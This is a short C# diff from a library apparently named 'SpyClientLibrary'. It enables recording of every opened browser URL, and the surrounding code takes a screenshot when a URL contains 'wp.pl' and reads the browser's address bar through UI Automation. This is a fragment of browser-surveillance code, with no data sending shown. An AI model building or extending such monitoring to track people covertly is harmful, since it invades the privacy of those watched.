@@ -44,7 +44,7 @@ namespace SpyClientLibrary
                 {
                     
                     //_firefoxProcess.Add(p);
-                    //_openedPages.Add(url);
+                    _openedPages.Add(url);
                     if(url.IndexOf("wp.pl")>-1)
                     {
                         ScreenShot s1 = new ScreenShot();
@@ -128,7 +128,8 @@ namespace SpyClientLibrary
                         return ((ValuePattern)doc3.GetCurrentPattern(ValuePattern.Pattern)).Current.Value as string;
                     }
                 }
-            }catch(Exception e)
+            }
+            catch (Exception e)
             {
                 return null;
             }
